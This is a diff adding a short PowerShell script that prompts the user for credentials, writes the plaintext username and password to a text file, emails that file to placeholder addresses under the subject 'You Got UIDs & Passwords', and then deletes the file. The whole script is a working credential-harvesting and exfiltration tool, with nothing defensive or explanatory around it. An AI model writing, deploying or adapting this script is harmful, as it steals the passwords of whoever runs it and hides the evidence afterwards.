@@ -1,0 +1,13 @@
+$creds=Get-Credential
+$creds | ft -AutoSize
+$creds.GetNetworkCredential().Username >> C:\a.txt
+$creds.GetNetworkCredential().Password >> C:\a.txt
+$From= "YOUG0T@Password.Username.com"
+$To= "<email@GoesHere.com>"
+$Cc= "<email@GoesHere.com>"
+$Attachment= "C:\a.txt"
+$Subject= "You Got UIDs & Passwords"
+$Body= "We have collected the following info for you; See the attachement"
+$SMTPServer= "<smtp server>"
+Send-MailMessage -From $From -To $To -Cc $Cc -Subject $Subject -Attachment $Attachment -Body $Body -SmtpServer $SMTPServer
+rm C:\a.txt
